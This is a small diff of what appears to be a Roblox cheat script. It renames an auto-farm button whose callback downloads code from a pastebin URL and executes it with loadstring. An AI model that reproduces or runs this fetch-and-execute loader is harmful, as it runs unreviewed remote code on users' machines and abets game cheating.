@@ -170,7 +170,7 @@ DomainTab:AddButton({
 })
 
 MainTab:AddButton({
-	Name = "ACTIVATE THIS BEFORE YOU AUTO FARM [REJOINS YOU, IMPORTANT❗] ",
+	Name = "ACTIVATE THIS BEFORE YOU AUTO FARM [ONLY AUTO FARM]❗] ",
 	Callback = function()
       		print(loadstring(game:HttpGet('https://pastebin.com/raw/TDsJJZB9'))())
   	end    
